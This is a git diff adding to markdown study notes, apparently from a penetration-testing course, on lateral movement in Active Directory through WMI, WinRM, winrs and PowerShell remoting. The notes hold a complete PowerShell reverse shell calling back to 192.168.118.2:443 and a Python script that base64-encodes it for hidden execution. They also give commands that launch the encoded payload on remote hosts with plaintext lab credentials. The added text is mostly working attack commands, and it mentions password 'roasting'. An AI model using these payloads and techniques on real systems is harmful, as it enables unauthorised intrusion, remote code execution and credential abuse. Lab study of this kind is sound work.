@@ -3198,3 +3198,69 @@ krbtgt:des-cbc-md5:683bdcba9e7c5de9
 ```
 
 we want the last part after NTDS.DIT secrets, before the three colons -> 1693c6cefafffc7af11ef34d1c788f47
+
+If we don't have RDP access from the start but we do have a login username and password, we can do some roasting to obtain other passwords, then try RDP
+
+## Lateral Movement in AD
+
+### WMI and WinRM
+In order to create a process on the remote target via WMI, we need credentials of a member of the Administrators local group, which can also be a domain user.
+UAC restrictions do not apply to domain user.
+
+launch a calculator instance example
+```
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+```
+
+can launch a reverse shell with base 64 encoding
+```
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+```
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+
+PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+winRM can be used for remote host management
+
+For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
+
+```
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+```
+
+can also just use the reverse shell from above
+```
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+```
+
+powershell also has winRM features
+```
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+```
+
+To interact with the session ID 1 we created, we can issue the Enter-PSSession cmdlet followed by the session ID.
+```
+Enter-PSSession 1
+```
